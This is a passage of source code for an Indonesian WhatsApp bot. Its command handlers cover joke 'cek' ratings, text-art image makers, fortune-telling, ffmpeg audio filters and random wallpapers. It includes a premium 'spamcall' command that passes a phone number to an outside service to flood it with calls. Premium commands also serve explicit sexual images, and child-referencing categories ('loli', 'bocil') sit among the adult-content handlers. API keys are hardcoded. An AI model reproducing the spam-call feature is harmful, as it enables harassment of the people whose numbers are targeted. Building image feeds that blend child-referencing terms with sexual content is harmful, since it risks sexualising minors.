case 'cekjelek': case 'cekcantik': case 'cekganteng': case 'ceksad': case 'cekharam': case 'cekhalal': case 'cekbego': case 'cekanjing': case 'cekbiadab': case 'cekramah': case 'ceksatir': case 'cekmanis': case 'cekpahit': case 'cekhitam': case 'cekrasis': case 'cekbaik': case 'cekjahat': case 'cekkaya': case 'cekmiskin': case 'cekpintar': case 'cekbodoh': case 'cekimut': case 'cekkocak': case 'cekkadang':   
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let x25 = `./sticker/cekStats_Now.webp`
let x26 = `./sticker/cekStats_Yes.webp`
const x27 = [true, false][Math.floor(Math.random() * ([true, false].length))]
if (x27 == true) {
conn.sendMessage(from, {sticker:{url:x25}},{quoted: { key: {fromMe: false, participant: `${sender}`, ...(from ? { remoteJid: "status@broadcast" } : {})},message: {"conversation": `[❎] Kamu tidak ${body.slice(4).trim().split(/ +/).shift().toLowerCase()} sama sekali🥴`}} })}
if (x27 == false) {
conn.sendMessage(from, {sticker:{url:x26}},{quoted: { key: {fromMe: false, participant: `${sender}`, ...(from ? { remoteJid: "status@broadcast" } : {})},message: {"conversation": `[✅] Ya begitulah, Kamu Sangat ${body.slice(4).trim().split(/ +/).shift().toLowerCase()} Sekali 🤥`}} }) }
break
case 'goblokcek': case 'jelekcek': case 'gaycek':
case 'lesbicek':case 'gantengcek': case 'cantikcek':case 'begocek': case 'suhucek':case 'pintercek':
case 'jagocek':case 'nolepcek':case 'babicek':case 'bebancek':case 'baikcek':
case 'jahatcek':case 'anjingcek':case 'haramcek':case 'pakboycek':
case 'pakgirlcek':case 'sangecek': case 'bapercek':case 'fakboycek':case 'alimcek':case 'suhucek':
case 'fakgirlcek':case 'kerencek':case 'wibucek':case 'pasarkascek':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
const eyy =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const yn = eyy[Math.floor(Math.random() * eyy.length)]
conn.sendMessage(from, { text: `${yn}%` }, { quoted: msg })
break
// TEXTPRO
case 'blackpink':case 'neon':case 'greenneon':case 'advanceglow':case 'futureneon':case 'sandwriting':case 'sandsummer':case 'sandengraved':case 'metaldark':case 'neonlight':case 'holographic':case 'text1917':case 'minion':case 'deluxesilver':case 'newyearcard':case 'bloodfrosted':case 'halloween':case 'jokerlogo':case 'fireworksparkle':case 'natureleaves':case 'bokeh':case 'toxic':case 'strawberry':case 'box3d':case 'roadwarning':case 'breakwall':case 'icecold':case 'luxury':case 'cloud':case 'summersand':case 'horrorblood':case 'thunder':{
if (!q) return reply(`_Contoh_\n${prefix+command} nama`)
reply(mess.wait)
conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/textprome/${command}?apikey=${setting.api_lolkey}&text=${q}`}, caption: `Nih ${command}📸` }, { quoted: msg })
}
break
// PHOTOOXY
case "metallic":
case "naruto":
case "butterfly":
case "flaming":{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`_Contoh_\n${prefix+command} nama`)
reply(mess.wait)
let photooxy =`https://api.nataganz.com/api/photooxy/${command}?text=${q}&apikey=Pasha`
conn.sendMessage(from, {image: { url: photooxy }, caption: `Hasil dari ${command}`}, { quoted: msg})
}
break
case 'wetglass':case 'multicolor3d':case 'watercolor':case 'luxurygold':case 'galaxywallpaper':case 'lighttext':case 'beautifulflower':case 'puppycute':case 'royaltext':case 'heartshaped':case 'birthdaycake':case 'galaxystyle':case 'hologram3d':case 'greenneon':case 'glossychrome':case 'greenbush':case 'metallogo':case 'noeltext':case 'glittergold':case 'textcake':case 'starsnight':case 'wooden3d':case 'textbyname':case 'writegalacy':case 'galaxybat':case 'snow3d':case 'birthdayday':case 'goldplaybutton':case 'silverplaybutton':case 'freefire':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) reply(`Contoh: #${command} nama`)
reply(mess.wait)
conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${setting.api_lolkey}&text=${q}`}, caption: `Nih ${command}📸` }, { quoted: msg })
}
break
case 'shadow':case 'cup':case 'cup1':case 'romance':case 'smoke':case 'burnpaper':case 'lovemessage':case 'undergrass':case 'love':case 'coffe':case 'woodheart':case 'woodenboard':case 'summer3d':case 'wolfmetal':case 'nature3d':case 'underwater':case 'goldenrose':case 'summernature':case 'letterleaves':case 'glowingneon':case 'fallleaves':case 'flamming':case 'harrypotter':case 'carvedwood':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) reply(`Contoh: #${command} nama`)
reply(mess.wait)
conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${setting.api_lolkey}&text=${q}`}, caption: `Nih ${command}📸` }, { quoted: msg })
}
break
case 'boneka': case 'cecan': case 'cogan': case 'darkjokes': case 'islamic': case 'mobil': case 'programing': case 'tatasurya': case 'wallhp':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
const x35  = JSON.parse(fs.readFileSync(`./function/Random_IMAGE/${command}.json`)); 
const x36 = x35[Math.floor(Math.random() * (x35.length))]
conn.sendMessage(from, {image:{url:x36}, caption:"Done!", mentions:[sender]},{quoted:msg})
break

// PREMIUM ONLY
// BIAR GAK DI SPAM

case 'bocil': case 'ukhty': case 'santuy': case 'rika': case 'hijaber': 
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
reply(mess.wait)
const x33 = JSON.parse(fs.readFileSync(`./function/Random_IMAGE/${command}.json`)); 
const x34 = x33[Math.floor(Math.random() * (x33.length))]
conn.sendMessage(from, {video:{url:x34.url}, caption:"Done!", mentions:[sender]},{quoted:msg})
break
case 'chiisaihentai':case 'trap':case 'blowjob':case 'yaoi':case 'ecchi':case 'ahegao':case 'hololewd':case 'sideoppai':case 'animefeets':case 'animebooty':case 'animethighss':case 'hentaiparadise':case 'animearmpits':case 'hentaifemdom':case 'lewdanimegirls':case 'biganimetiddies':case 'animebellybutton':case 'hentai4everyone':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
reply(mess.wait)
conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${setting.api_lolkey}`}, caption: `Nih ${command}📸` }, { quoted: msg })
}
break
case 'bj':case 'ero':case 'cum':case 'feet':case 'yuri':case 'trap':case 'lewd':case 'feed':case 'eron':case 'solo':case 'gasm':case 'poke':case 'anal':case 'holo':case 'tits':case 'kuni':case 'kiss':case 'erok':case 'smug':case 'baka':case 'solog':case 'feetg':case 'lewdk':case 'waifu':case 'pussy':case 'femdom':case 'cuddle':case 'hentai':case 'eroyuri':case 'cum_jpg':case 'blowjob':case 'erofeet':case 'holoero':case 'classic':case 'erokemo':case 'fox_girl':case 'futanari':case 'lewdkemo':case 'wallpaper':case 'pussy_jpg':case 'kemonomimi':case 'nsfw_avatar':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
reply(mess.wait)
conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random2/${command}?apikey=${setting.api_lolkey}`}, caption: `Nih ${command}📸` }, { quoted: msg})
}
break
case 'spamcall':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Kirim perintah\n#${command} nomor\n\nContoh? #${command} 8xxxx\nNomor awal dari 8 bukan 62/08`)
var data = await fetchJson(`https://arugaz.herokuapp.com/api/spamcall?no=${q}`).catch(() => reply(mess.error.api))
if (data.status == false) {
reply(data.msg)
} else {
reply(data.logs)
}
}
break
// LOGO MAKER
case 'girlneko': case 'gilrneko':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q1 && !q2) return reply("Masukkan text1&text2\nContoh? #girlneko aku&kamu")
reply("[❗] SEDANG DIPROSES")
conn.sendMessage(from, {image:{url:`https://ziy.herokuapp.com/api/maker/girlneko?text1=${q1}&text2=${q2}&apikey=xZiyy`}, caption:"done!!", mentions:[sender]},{quoted:msg})
break
case 'sadboy':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q1 && !q2) return reply("Masukkan text1&text2\nContoh? #sadboy aku&kamu")
reply("[❗] SEDANG DIPROSES")
conn.sendMessage(from, {image:{url:`https://ziy.herokuapp.com/api/maker/sadboy?text1=${q1}&text2=${q2}&apikey=xZiyy`}, caption:"done!!", mentions:[sender]},{quoted:msg})
break
case 'kaneki': case 'rem': case 'lolimaker':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Masukkan text\nContoh: #${command} bot`)
reply("[❗] SEDANG DIPROSES")
conn.sendMessage(from, {image:{url:`https://ziy.herokuapp.com/api/maker/${command}?nama=${q}&apikey=xZiyy`}, caption:"done!!", mentions:[sender]},{quoted:msg})
break
case 'waifu':case 'lick':case 'kiss':case 'awoo':case 'hug':case 'cry':case 'cuddle':case 'bully':case 'megumin':case 'shinobu':case 'neko':case 'slap':case 'wink':case 'dance':case 'poke':case 'glomp':case 'bite':case 'nom':case 'handhold':case 'highfive':case 'wave':case 'smile':case 'yeet':case 'bonk':case 'smug':case 'pat':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
reply("[❗] SEDANG DIPROSES")
fetchJson(`https://api.waifu.pics/sfw/${command}`).then(x => {
conn.sendMessage(from, {image:{url:x.url}, caption:"Done!!", mentions:[sender]},{quoted:msg})})
break
case 'dadu':
case 'patrick':
case 'amongus':
case 'gawrgura':
case 'anjing':
case 'bucinstick':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
reply(mess.wait)
let buffer = `https://api.lolhuman.xyz/api/sticker/${command}?apikey=${setting.api_lolkey}`
conn.sendMessage(from, { sticker:{url:buffer}, mimetype:'image/webp'}, { quoted: msg })
}
break
// PRIMBON
case 'ramalanjodoh': case 'ramaljodoh': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Example :\n${prefix+command} Yanto, 7, 7, 2005, Yanti, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`> *Nama Anda :* ${anu.message.nama_anda.nama}\n> *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n> *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n> *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n> *Hasil :* ${anu.message.result}\n> *Catatan :* ${anu.message.catatan}`)
}
break
case 'nomorhoki':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Example :\n${prefix+command} 6288292024190`)
let anu = await primbon.nomer_hoki(q)
if (anu.status == false) return reply(anu.message)
reply (`> *Nomor HP :* ${anu.message.nomer_hp}\n> *Angka Shuzi :* ${anu.message.angka_shuzi}\n> *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n> *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`)
}
break
case 'artimimpi': case 'tafsirmimpi': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
 if (!q) return reply( `Example :\n${prefix+command} belanja`)
let anu = await primbon.tafsir_mimpi(q)
if (anu.status == false) return m.reply(anu.message)
reply(`> *Mimpi :* ${anu.message.mimpi}\n> *Arti :* ${anu.message.arti}\n> *Solusi :* ${anu.message.solusi}`)
}
break
case 'ramalanjodohbali': case 'ramaljodohbali': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply( `Example :\n${prefix+command} Yanto, 7, 7, 2005, Yanti, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`> *Nama Anda :* ${anu.message.nama_anda.nama}\n> *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n> *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n> *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n> *Hasil :* ${anu.message.result}\n> *Catatan :* ${anu.message.catatan}`)
}
break
case 'suamiistri': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply( `Example :\n${prefix+command} Yanto, 7, 7, 2005, Yanti, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
reply(`> *Nama Suami :* ${anu.message.suami.nama}\n> *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n> *Nama Istri :* ${anu.message.istri.nama}\n> *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n> *Hasil :* ${anu.message.result}\n> *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalancinta': case 'ramalcinta': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Example :\n${prefix+command} Yanto, 7, 7, 2005, Yanti, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`> *Nama Anda :* ${anu.message.nama_anda.nama}\n> *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n> *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n> *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n> *Sisi Positif :* ${anu.message.sisi_positif}\n> *Sisi Negatif :* ${anu.message.sisi_negatif}\n> *Catatan :* ${anu.message.catatan}`)
}
break
case 'artinama':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Example :\n${prefix+command} Yanto`)
let anu = await primbon.arti_nama(text)
if (anu.status == false) return reply(anu.message)
reply(`> *Nama :* ${q}\n> *Arti :* ${anu.message.arti}\n> *Catatan :* ${anu.message.catatan}`)
}
break
case 'kecocokannama': case 'cocoknama': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply( `Example :\n${prefix+command} yanto, 7, 7, 2005`)
let [nama, tgl, bln, thn] = q.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`> *Nama :* ${anu.message.nama}\n> *Lahir :* ${anu.message.tgl_lahir}\n> *Life Path :* ${anu.message.life_path}\n> *Destiny :* ${anu.message.destiny}\n> *Destiny Desire :* ${anu.message.destiny_desire}\n> *Personality :* ${anu.message.personality}\n> *Persentase :* ${anu.message.persentase_kecocokan}`)
}
break
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Example :\n${prefix+command} yanto|yanti`)
let [nama1, nama2] = q.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return reply(anu.message)
reply(`> *Nama Anda :* ${anu.message.nama_anda}\n> *Nama Pasangan :* ${anu.message.nama_pasangan}\n> *Sisi Positif :* ${anu.message.sisi_positif}\n> *Sisi Negatif :* ${anu.message.sisi_negatif}`)
}
break
case 'sifatusaha': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Example : ${prefix+command} 24, 10, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`> *Lahir :* ${anu.message.hari_lahir}\n> *Usaha :* ${anu.message.usaha}`)
}
break
case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh': 
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!quoted && !q) reply(`Kirim/reply text dengan caption *${prefix+command}*`)
var ter = command[0].toLowerCase()
var tex = quoted ? quoted.text ? quoted.text : q ? q : text : q ? q : text
reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
break

// AUDIO CHANGER
case 'bass':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-af equalizer=f=54:width_type=o:width=2:g=20'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'blown':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-af acrusher=.1:1:64:0:log'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'deep':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-af atempo=4/4,asetrate=44500*2/3'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'earrape':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-af volume=12'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'fast':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter:a "atempo=1.63,asetrate=44100"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'fat':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter:a "atempo=1.6,asetrate=22100"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'nightcore':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter_complex "areverse'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'reverse':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter_complex "areverse"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'robot':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'slow':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter:a "atempo=0.7,asetrate=44100"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'smooth':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'tupai':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter:a "atempo=0.5,asetrate=65100"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'wallpaperislami':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let kcle = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/Islamic.json`)
let random = kcle[Math.floor(Math.random() * kcle.length)]
conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
}
break
case 'wallpaperinori':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let kuxe = await fetchJson(`https://raw.githubusercontent.com/qisyana/senku/main/storages/inori-pic.json`)
let random = kuxe[Math.floor(Math.random() * kuxe.length)]
conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
}
break
case 'wallpapercyber':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let xpwl = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/CyberSpace.json`)
let random = xpwl[Math.floor(Math.random() * xpwl.length)]
conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
}
break

// Random image
case 'waifu':
case 'loli':
case 'husbu':
case 'milf':
case 'cosplay':
case 'wallml':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let eek = await fetchJson(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)
let random = eek[Math.floor(Math.random() * eek.length)]
conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
}
break
case 'wallpaperteknologi':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let toth = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/Technology.json`)
let random = toth[Math.floor(Math.random() * toth.length)]
conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
}
break
case 'wallpaperanime':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let tozs = await fetchJson(`https://raw.githubusercontent.com/qisyana/senku/main/storages/anime-wallpaper-pic.json`)
let random = tozs[Math.floor(Math.random() * tozs.length)]
conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
}
break
case 'wallpapergamer':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let toew = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/GameWallp.json`)
let random = toew[Math.floor(Math.random() * toew.length)]
conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
}
break
case 'wallpaperprogamer':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let xeke = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/Programming.json`)
let random = xeke[Math.floor(Math.random() * xeke.length)]
conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
}
break
case 'wallpapermeme':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let crkr = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/meme.json`)
let random = crkr[Math.floor(Math.random() * crkr.length)]
conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
}
break
case 'wallpaper':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let crpe = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/Mountain.json`)
let random = crpe[Math.floor(Math.random() * crpe.length)]
conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
}
break
case 'ppcouple': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
conn.sendMessage(from, { image: { url: random.male }, caption: `Foto Couple Male` }, { quoted: msg })
